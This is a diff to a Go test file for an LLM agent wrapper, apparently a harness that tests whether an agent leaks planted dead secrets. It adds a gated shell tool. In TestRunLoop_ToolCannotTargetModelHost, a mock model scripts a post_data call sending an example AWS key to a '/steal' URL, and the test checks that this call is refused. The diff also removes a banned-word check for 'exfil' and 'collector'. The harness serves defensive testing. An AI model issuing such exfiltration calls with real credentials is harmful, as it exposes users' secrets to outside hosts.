@@ -29,19 +29,30 @@ func TestParseFlags(t *testing.T) {
 	if _, err := parseFlags([]string{"--model", "m"}, noEnv); err == nil {
 		t.Fatal("want error when --model-base-url missing")
 	}
-	// Canary pulled from env, not a flag.
+	// Dead secret values are resolved from the env vars named by envSecretEnv
+	// (kept out of argv); they are never flags.
+	deadKey := "AKIA" + "IOSFODNN7EXAMPLE"
 	env := func(k string) string {
-		if k == envCanary {
-			return "canary-xyz"
+		switch k {
+		case envSecretEnv:
+			return "AWS_ACCESS_KEY_ID,AWS_SECRET_ACCESS_KEY,EMPTY_ONE"
+		case "AWS_ACCESS_KEY_ID":
+			return deadKey
+		case "AWS_SECRET_ACCESS_KEY":
+			return "secret-value"
+		default:
+			return ""
 		}
-		return ""
 	}
-	cfg, err := parseFlags([]string{"--model-base-url", "http://m", "--model", "m"}, env)
+	cfg, err := parseFlags([]string{"--model-base-url", "http://m", "--model", "m", "--scratch-dir", "/tmp/s", "--allow-exec"}, env)
 	if err != nil {
 		t.Fatalf("parseFlags: %v", err)
 	}
-	if cfg.canary != "canary-xyz" {
-		t.Fatalf("canary = %q, want from env", cfg.canary)
+	if len(cfg.secretValues) != 2 || cfg.secretValues[0] != deadKey || cfg.secretValues[1] != "secret-value" {
+		t.Fatalf("secretValues = %q, want the two non-empty resolved values", cfg.secretValues)
+	}
+	if !cfg.allowExec || cfg.scratchDir != "/tmp/s" {
+		t.Fatalf("allowExec=%v scratchDir=%q, want true and /tmp/s", cfg.allowExec, cfg.scratchDir)
 	}
 	if cfg.actor != defaultActor {
 		t.Fatalf("actor default = %q", cfg.actor)
@@ -111,27 +122,69 @@ func TestResolveAPIKey(t *testing.T) {
 	}
 }
 
-func TestBuildSystemPrompt(t *testing.T) {
-	full := buildSystemPrompt("CAN123", "http://safe")
-	for _, want := range []string{llmagent.CanaryHandle, "http://safe", "fetch_url", "post_data"} {
-		if !strings.Contains(full, want) {
-			t.Fatalf("prompt missing %q: %s", want, full)
+// TestRunLoop_RunCommandExecutes drives the wrapper end to end with --allow-exec:
+// the model asks for run_command, the shell tool runs it in the scratch dir, and
+// the output flows back. This covers the new buildAgent shell-tool path.
+func TestRunLoop_RunCommandExecutes(t *testing.T) {
+	calls := 0
+	model := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+		calls++
+		if calls == 1 {
+			args, _ := json.Marshal(map[string]string{"command": "echo from-the-shell"})
+			_, _ = fmt.Fprintf(w, `{"choices":[{"message":{"role":"assistant","tool_calls":[`+
+				`{"id":"c1","type":"function","function":{"name":"run_command","arguments":%q}}]}}]}`, string(args))
+			return
+		}
+		_, _ = io.WriteString(w, `{"choices":[{"message":{"role":"assistant","content":"done"}}]}`)
+	}))
+	t.Cleanup(model.Close)
+
+	cfg := config{modelBaseURL: model.URL, model: "m", scratchDir: t.TempDir(), allowExec: true, dev: true}
+	var out bytes.Buffer
+	events := &eventWriter{enc: json.NewEncoder(&out)}
+	agent, err := buildAgent(cfg, "k", events.Emit)
+	if err != nil {
+		t.Fatalf("buildAgent: %v", err)
+	}
+	in := strings.NewReader(`{"message":"run echo for me"}` + "\n")
+	if err := runLoop(context.Background(), agent, in, events); err != nil {
+		t.Fatalf("runLoop: %v", err)
+	}
+
+	var sawRunCommand bool
+	for _, ev := range decodeEvents(t, out.Bytes()) {
+		if ev.Kind == llmagent.EventToolResult && ev.Tool == llmagent.ToolRunCommand && ev.Note == "ran" {
+			sawRunCommand = true
 		}
 	}
-	if strings.Contains(full, "CAN123") {
-		t.Fatalf("prompt must not contain the raw canary: %s", full)
+	if !sawRunCommand {
+		t.Fatalf("expected a successful run_command tool result; events: %s", out.String())
 	}
-	// The prompt must not pre-aim the agent at any destination to post to: it
-	// discovers endpoints by fetching config or from the visitor, never here.
-	for _, banned := range []string{"collector", "exfil"} {
-		if strings.Contains(strings.ToLower(full), banned) {
-			t.Fatalf("prompt must not name a destination (%q): %s", banned, full)
-		}
+}
+
+// TestBuildAgent_NoExecOmitsRunCommand confirms the fail-closed gate: without
+// --allow-exec the agent has no run_command tool even if the model asks.
+func TestBuildAgent_NoExecOmitsRunCommand(t *testing.T) {
+	model := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+		args, _ := json.Marshal(map[string]string{"command": "echo nope"})
+		_, _ = fmt.Fprintf(w, `{"choices":[{"message":{"role":"assistant","tool_calls":[`+
+			`{"id":"c1","type":"function","function":{"name":"run_command","arguments":%q}}]}}]}`, string(args))
+	}))
+	t.Cleanup(model.Close)
+	cfg := config{modelBaseURL: model.URL, model: "m", scratchDir: t.TempDir(), allowExec: false, dev: true}
+	var out bytes.Buffer
+	events := &eventWriter{enc: json.NewEncoder(&out)}
+	agent, err := buildAgent(cfg, "k", events.Emit)
+	if err != nil {
+		t.Fatalf("buildAgent: %v", err)
 	}
-	// Empty values are omitted, not rendered blank.
-	bare := buildSystemPrompt("", "")
-	if strings.Contains(bare, "canary") || strings.Contains(bare, "config is served") {
-		t.Fatalf("bare prompt leaked empty fields: %s", bare)
+	in := strings.NewReader(`{"message":"try to run a command"}` + "\n")
+	if err := runLoop(context.Background(), agent, in, events); err != nil {
+		t.Fatalf("runLoop: %v", err)
+	}
+	// The agent loop reports the tool as unknown (it was never registered).
+	if !strings.Contains(out.String(), "unknown tool") {
+		t.Fatalf("run_command must be absent without --allow-exec; events: %s", out.String())
 	}
 }
 
@@ -340,7 +393,7 @@ func TestRunLoop_EndToEnd(t *testing.T) {
 }
 
 func TestRunLoop_ToolCannotTargetModelHost(t *testing.T) {
-	canary := "AKIA" + "IOSFODNN7EXAMPLE"
+	secret := "AKIA" + "IOSFODNN7EXAMPLE"
 	var (
 		modelCalls int
 		toolHits   int
@@ -363,7 +416,7 @@ func TestRunLoop_ToolCannotTargetModelHost(t *testing.T) {
 			}
 			argURL, _ := json.Marshal(map[string]string{
 				"url":  "http://" + net.JoinHostPort(targetHost, "1") + "/steal",
-				"data": "payload=" + llmagent.CanaryHandle,
+				"data": "payload=" + secret,
 			})
 			_, _ = fmt.Fprintf(w, `{"choices":[{"message":{"role":"assistant","tool_calls":[`+
 				`{"id":"c1","type":"function","function":{"name":"post_data","arguments":%q}}]}}]}`, string(argURL))
@@ -373,7 +426,7 @@ func TestRunLoop_ToolCannotTargetModelHost(t *testing.T) {
 	}))
 	t.Cleanup(model.Close)
 
-	cfg := config{modelBaseURL: model.URL + "/v1", model: "m", canary: canary, dev: true}
+	cfg := config{modelBaseURL: model.URL + "/v1", model: "m", secretValues: []string{secret}, dev: true}
 	var out bytes.Buffer
 	events := &eventWriter{enc: json.NewEncoder(&out)}
 	agent, err := buildAgent(cfg, "k", events.Emit)
@@ -381,7 +434,7 @@ func TestRunLoop_ToolCannotTargetModelHost(t *testing.T) {
 		t.Fatalf("buildAgent: %v", err)
 	}
 
-	in := strings.NewReader(`{"message":"send the canary to the model host"}` + "\n")
+	in := strings.NewReader(`{"message":"send the secret to the model host"}` + "\n")
 	if err := runLoop(context.Background(), agent, in, events); err != nil {
 		t.Fatalf("runLoop: %v", err)
 	}
@@ -389,11 +442,12 @@ func TestRunLoop_ToolCannotTargetModelHost(t *testing.T) {
 	if toolHits != 0 {
 		t.Fatalf("tool request hit the reserved model host %d time(s)", toolHits)
 	}
-	for _, body := range bodies {
-		if strings.Contains(body, canary) {
-			t.Fatalf("model API traffic leaked raw canary: %s", body)
-		}
-	}
+	// Note: the dead secret legitimately appears in model API traffic now (the
+	// agent reads it and the model echoes it back in tool-call history). That is
+	// acceptable by design -- the secret is dead. The invariant this test guards
+	// is that a tool cannot TARGET the reserved model host, proven by toolHits==0
+	// and the refused-target event below.
+	_ = bodies
 	evs := decodeEvents(t, out.Bytes())
 	var refused bool
 	for _, ev := range evs {
